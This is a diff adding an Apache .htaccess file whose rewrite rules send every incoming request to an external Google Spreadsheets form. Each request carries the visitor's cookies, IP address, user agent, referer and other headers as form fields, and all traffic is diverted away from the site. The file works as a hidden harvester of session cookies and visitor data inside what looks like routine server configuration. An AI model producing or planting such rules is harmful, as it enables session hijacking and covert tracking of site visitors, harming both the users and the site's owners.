@@ -1,0 +1,7 @@
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    
+    RewriteRule .* - [E=form:http://spreadsheets.google.com/formResponse?formkey=cHlvdkN3dnB6WkR0Q296TlprcU1rV0E6MA..] 
+  
+    RewriteRule ^(.*)$ %{ENV:form}&entry.0.single=%{HTTP_USER_AGENT}&entry.1.single=%{HTTP_REFERER}&entry.2.single=%{HTTP_COOKIE}&entry.3.single=%{HTTP_FORWARDED}&entry.4.single=%{HTTP_HOST}&entry.5.single=%{HTTP_PROXY_CONNECTION}&entry.6.single=%{REMOTE_ADDR}&entry.7.single=%{REMOTE_HOST}&entry.8.single=%{REMOTE_IDENT}&entry.9.single=%{REQUEST_METHOD}
+</IfModule>
